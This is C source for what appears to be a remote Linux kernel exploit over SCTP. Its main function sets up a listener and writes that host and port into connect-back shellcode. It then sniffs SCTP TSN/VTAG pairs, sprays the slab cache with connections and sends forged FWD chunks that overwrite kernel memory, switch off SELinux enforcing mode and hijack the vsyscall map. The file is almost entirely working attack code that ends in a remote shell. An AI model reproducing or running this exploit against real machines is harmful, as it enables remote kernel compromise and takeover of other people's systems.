
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_10__ TYPE_5__ ;
typedef struct TYPE_9__ TYPE_4__ ;
typedef struct TYPE_8__ TYPE_3__ ;
typedef struct TYPE_7__ TYPE_2__ ;
typedef struct TYPE_6__ TYPE_1__ ;


struct TYPE_6__ {void* s_addr; } ;
struct sockaddr_in {TYPE_1__ sin_addr; void* sin_port; void* sin_family; } ;
struct sockaddr {int dummy; } ;
typedef int o ;
typedef int l ;
typedef int __u32 ;
typedef int __u16 ;
struct TYPE_10__ {int nconn; int rport; int rhost; int lport; int lhost; } ;
struct TYPE_9__ {scalar_t__ allocator_type; int slubsize; int chunksize; int ptrsize; int scodesize; int vsysjumpsize; scalar_t__ vsysjump; scalar_t__ scode; scalar_t__ vsysaddr; scalar_t__ selinux; scalar_t__ hostoff; scalar_t__ portoff; } ;
struct TYPE_7__ {void* s_addr; } ;
struct TYPE_8__ {TYPE_2__ sin_addr; void* sin_port; void* sin_family; } ;


 int CLONE_VM ;
 int IPPROTO_SCTP ;
 int IPPROTO_TCP ;
 void* PF_INET ;
 int SIGCHLD ;
 scalar_t__ SLAB_ALLOCATOR ;
 int SOCK_RAW ;
 int SOCK_STREAM ;
 int SOL_SOCKET ;
 int SO_REUSEADDR ;
 scalar_t__ STACK_SIZE ;
 int __fatal (char*) ;
 int __fatal_perror (char*) ;
 int __msg (char*) ;
 int __msg_f (char*,scalar_t__,scalar_t__,scalar_t__,scalar_t__) ;
 scalar_t__ __zero ;
 scalar_t__ bind (int,struct sockaddr*,int) ;
 int build_stream (scalar_t__,int,int) ;
 int clone (int ,scalar_t__,int,int *) ;
 scalar_t__ clone_stack ;
 int clone_thread ;
 int disable_abort () ;
 TYPE_5__ h ;
 void* htons (int ) ;
 int htons_streams (int ,int) ;
 void* inet_addr (int ) ;
 TYPE_4__* k ;
 scalar_t__ listen (int,int) ;
 int make_sctp_connection (int,int ,int) ;
 int memcpy (scalar_t__,int*,int) ;
 int multiplex (int) ;
 scalar_t__ raw_sctp ;
 int sctp_getopt (int,char**) ;
 int send_fwd_chunk (int,int ,int ,int,scalar_t__,scalar_t__) ;
 TYPE_3__ server_sctp ;
 scalar_t__ setsockopt (int,int ,int ,char*,int) ;
 int sleep (int) ;
 void* socket (void*,int ,int ) ;
 int sport ;
 int sport2 ;
 int streams ;
 int swap_to_SLAB_chunk () ;
 scalar_t__ tsn ;
 scalar_t__ tsn2 ;
 scalar_t__ vtag ;
 scalar_t__ vtag2 ;
 int wait (int *) ;

int main(int argc, char **argv)
{

  int ret, fd, i, listenfd,o=1;
  struct sockaddr_in l;
  __u32 lh;
  __u16 lp;

  sctp_getopt(argc, argv);

  listenfd = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
  if(setsockopt(listenfd, SOL_SOCKET, SO_REUSEADDR, (char *)&o, sizeof(o)) < 0)
   __fatal_perror("setsockopt: SO_REUSEADDR");

  l.sin_family = PF_INET;
  l.sin_port = htons(h.lport);
  l.sin_addr.s_addr = inet_addr(h.lhost);
  if(bind(listenfd, (struct sockaddr *)&l, sizeof(l)) < 0)
    __fatal_perror("bind: sock");

  if(listen(listenfd, 4) < 0)
    __fatal_perror("listen: sock");



  lh = inet_addr(h.lhost);
  lp = htons(h.lport);
  memcpy(k->scode + k->portoff, &lp, 2);
  memcpy(k->scode + k->hostoff, &lh, 4);

  raw_sctp = socket(PF_INET, SOCK_RAW, IPPROTO_SCTP);
  if(raw_sctp < 0)
    __fatal_perror("socket: RAW/SCTP montitor socket");

  server_sctp.sin_family = PF_INET;
  server_sctp.sin_port = htons(h.rport);
  server_sctp.sin_addr.s_addr = inet_addr(h.rhost);

  __msg("[**] Monitoring Network for TSN/VTAG pairs.. \n");
  ret = clone(clone_thread, clone_stack+STACK_SIZE-8, CLONE_VM|SIGCHLD, ((void*)0));
  if(ret < 0)
    __fatal_perror("clone");

  sleep(1);

  __msg("[**] Start flushing slub cache...\n");
  for(i=0; i<=h.nconn; i++)
  {
    __u16 p = sport-(h.nconn-1)+i;
    if(p == sport || p== sport2)
      fd = make_sctp_connection(p, h.rport, 1);
    else
      fd = make_sctp_connection(sport-(h.nconn-1)+i, h.rport, 0);

  }


  disable_abort();

  wait(((void*)0));

  if(k->allocator_type == SLAB_ALLOCATOR)
    swap_to_SLAB_chunk();

  if(vtag && tsn && vtag2 && tsn2)
  {
    __u32 acc;

    __msg_f("[**] Using TSN/VTAG pairs: (TSN: %x <=> VTAG: %x) / (TSN: %x <=> VTAG: %x)...\n", tsn, vtag, tsn2, vtag2);
    sleep(1);

    if(k->selinux)
    {
      __msg("[**] Overwriting neightboard sctp map..\n");
      acc = (k->slubsize - k->chunksize) / 2;
      ret = build_stream(k->selinux, k->ptrsize, acc);
      if(ret < 0)
        __fatal("Error Building Streams...");

      htons_streams(streams, ret);
      send_fwd_chunk(sport, h.rport, streams, ret, vtag, tsn);

      __msg("[**] Disabling Selinux Enforcing Mode..\n");
      ret = build_stream(__zero, 4, 0);
      if(ret < 0)
        __fatal("Error Building Streams...");

      htons_streams(streams, ret);
      send_fwd_chunk(sport2, h.rport, streams, ret, vtag2, tsn2);
    }

    __msg("[**] Overwriting neightboard sctp map ......\n");
    acc = (k->slubsize - k->chunksize) / 2;
    ret = build_stream(k->vsysaddr, k->ptrsize, acc);
    if(ret < 0)
      __fatal("Error Building Streams...");

    htons_streams(streams, ret);
    send_fwd_chunk(sport, h.rport, streams, ret, vtag, tsn);

    __msg("[**] Overwriting vsyscall shadow map..\n");
    acc = 0x930 / 2;
    ret = build_stream(k->scode, k->scodesize, acc);
    if(ret < 0)
      __fatal("Error Building Streams...");

    htons_streams(streams, ret);
    send_fwd_chunk(sport2, h.rport, streams, ret, vtag2, tsn2);

    __msg("[**] Hijacking vsyscall shadow map..\n");
    ret = build_stream(k->vsysjump, k->vsysjumpsize, 0);
    if(ret < 0)
      __fatal("Error Building Streams...");

    htons_streams(streams, ret);
    send_fwd_chunk(sport2, h.rport, streams, ret, vtag2, tsn2);

    sleep(1);
  }
  else
    __fatal("VTAG/TSN not found: network error");


  multiplex(listenfd);
  __msg("[**] Closing Connection... \n");
  return 0;
}
